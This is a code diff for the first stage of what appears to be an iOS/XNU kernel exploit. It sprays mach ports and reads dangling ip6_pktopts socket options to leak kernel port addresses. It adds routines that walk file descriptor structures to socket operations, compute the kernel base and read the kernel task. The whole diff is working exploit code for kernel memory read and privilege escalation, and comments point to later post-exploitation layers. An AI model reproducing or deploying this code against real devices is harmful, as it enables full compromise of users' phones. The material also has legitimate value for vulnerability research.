@@ -10,7 +10,11 @@ extern "C" {
 
 #include "util.h"
 
+#define DTYPE_SOCKET 2
+
 const uint32_t kSprayCount = 256;
+
+const uint32_t kDanglingOptionSprayCount = 64;
 
 // Number of spray attempts before giving up
 const uint32_t kAttempts = 20;
@@ -37,7 +41,7 @@ bool StageOne::Read20(void *address, uint8_t *data) {
 
 bool StageOne::ReadFreeInternal(void *address, uint8_t *data, bool freeing) {
   std::vector<std::unique_ptr<DanglingOptions>> dangling_options;
-  for (int i = 0; i < 128; i++) {
+  for (int i = 0; i < kDanglingOptionSprayCount; i++) {
     dangling_options.emplace_back(new DanglingOptions);
   }
 
@@ -90,31 +94,58 @@ bool StageOne::ReadFreeInternal(void *address, uint8_t *data, bool freeing) {
   return false;
 }
 
-bool StageOne::GetPortAddr(mach_port_t port, uint64_t *port_kaddr) {
-  std::unique_ptr<DanglingOptions> dangling_options(new DanglingOptions());
+// On inspection, does this address appear to point to an ipc_port struct?
+bool StageOne::LooksLikePort(uint64_t maybe_port_addr,
+                             uint32_t expected_ip_bits) {
+  uint32_t ip_bits;
+  if (!Read<uint32_t>(maybe_port_addr + OFFSET(ipc_port, ip_bits), &ip_bits)) {
+    printf("Couldn't read ip_bits\n");
+    return false;
+  }
+
+  if (ip_bits != expected_ip_bits) {
+    return false;
+  }
+
+  return true;
+}
+
+bool StageOne::GetPortAddr(mach_port_t port, uint32_t expected_ip_bits,
+                           uint64_t *port_kaddr) {
+  sprayer_.Clear();
+
+  std::vector<std::unique_ptr<DanglingOptions>> dangling_options;
+  for (int i = 0; i < kDanglingOptionSprayCount; i++) {
+    dangling_options.emplace_back(new DanglingOptions);
+  }
 
   for (uint32_t i = 0; i < kAttempts; i++) {
     if (!sprayer_.SprayOOLPorts(SIZE(ip6_pktopts), port)) {
       printf("GetPortAddr: failed to spray\n");
       return false;
     }
-    int minmtu = -1;
-    if (!dangling_options->GetMinmtu(&minmtu)) {
-      printf("GetPortAddr: failed to GetMinmtu to detect leak\n");
-      return false;
-    }
-    int prefer_tempaddr = -1;
-    if (!dangling_options->GetPreferTempaddr(&prefer_tempaddr)) {
-      printf("GetPortAddr: failed to GetPreferTempaddr\n");
-    }
-    uint64_t maybe_port_kaddr = ((uint64_t)minmtu << 32) | prefer_tempaddr;
-    if (!LooksLikeKaddr(maybe_port_kaddr)) {
-      usleep(100000);
-      continue;
-    }
+    for (uint32_t j = 0; j < dangling_options.size(); j++) {
+      int minmtu = -1;
+      if (!dangling_options[j]->GetMinmtu(&minmtu)) {
+        printf("GetPortAddr: failed to GetMinmtu to detect leak\n");
+        return false;
+      }
+      int prefer_tempaddr = -1;
+      if (!dangling_options[j]->GetPreferTempaddr(&prefer_tempaddr)) {
+        printf("GetPortAddr: failed to GetPreferTempaddr\n");
+      }
+      uint64_t maybe_port_kaddr = ((uint64_t)minmtu << 32) | prefer_tempaddr;
+      if (!LooksLikeKaddr(maybe_port_kaddr)) {
+        continue;
+      }
+      if (!LooksLikePort(maybe_port_kaddr, expected_ip_bits)) {
+        continue;
+      }
 
-    *port_kaddr = maybe_port_kaddr;
-    return true;
+      *port_kaddr = maybe_port_kaddr;
+      return true;
+    }
+    usleep(100000);
   }
 
   return false;
@@ -192,6 +223,7 @@ bool StageOne::GetKernelTaskFromPort(uint64_t port,
   }
 
   if (ip_bits != io_makebits(1, IOT_PORT, IKOT_TASK)) {
+    // printf("Did not see an active task port, got 0x%x\n", ip_bits);
     return false;
   }
 
@@ -243,10 +275,56 @@ static void iterate_ipc_ports(size_t size, void (^callback)(size_t port_offset,
 bool StageOne::GetKernelTaskFromHostPort(uint64_t host_port,
                                          uint64_t *kernel_task) {
   uint64_t port_block = host_port & ~(BLOCK_SIZE(ipc_port) - 1);
-  iterate_ipc_ports(BLOCK_SIZE(ipc_port), ^(size_t port_offset, bool *stop) {
+  uint64_t iterate_size = BLOCK_SIZE(ipc_port);
+  iterate_ipc_ports(iterate_size, ^(size_t port_offset, bool *stop) {
     uint64_t candidate_port = port_block + port_offset;
     bool found = GetKernelTaskFromPort(candidate_port, kernel_task);
     *stop = found;
   });
   return *kernel_task != 0;
+}
+
+bool StageOne::GetKernelTaskFromFdOfiles(uint64_t fd_ofiles,
+                                         uint64_t *kernel_task) {
+  DanglingOptions dangling_options;
+  int fd = dangling_options.GetFd();
+  if (fd < 0) {
+    printf("GetKernelTaskFromFdOfiles: bad file descriptor\n");
+    return false;
+  }
+
+  std::vector<uint64_t> fd_ofiles_to_fg_ops = {
+      static_cast<uint64_t>(fd) * 8ul,
+      OFFSET(fileproc, f_fglob),
+      OFFSET(fileglob, fg_ops),
+  };
+
+  uint64_t socketops;
+  if (!ReadMany<uint64_t>(fd_ofiles, fd_ofiles_to_fg_ops, &socketops)) {
+    printf("GetKernelTaskFromFdOfiles: failed to read socketops\n");
+    return false;
+  }
+
+  // This type checking is not strictly necessary but is better validation
+  // at the cost of one extra read/spray.
+  uint32_t fo_type;
+  if (!Read<uint32_t>(socketops + OFFSET(fileops, fo_type), &fo_type)) {
+    printf("Failed to read socket opt types\n");
+    return false;
+  }
+
+  if (fo_type != DTYPE_SOCKET) {
+    printf("Found non-socket fo_type\n");
+    return false;
+  }
+
+  // TODO(nedwill): We now have the kernel base. We should inform other
+  // post-exploitation layers that use information about this value so
+  // they don't redo the work.
+  uint64_t kernel_base = socketops - OFFSET(kernel_base, socketops);
+  printf("Found kernel_base 0x%llx\n", kernel_base);
+
+  uint64_t kernproc = kernel_base + OFFSET(kernel_base, kernproc);
+
+  return Read<uint64_t>(kernproc + OFFSET(proc, task), kernel_task);
 }
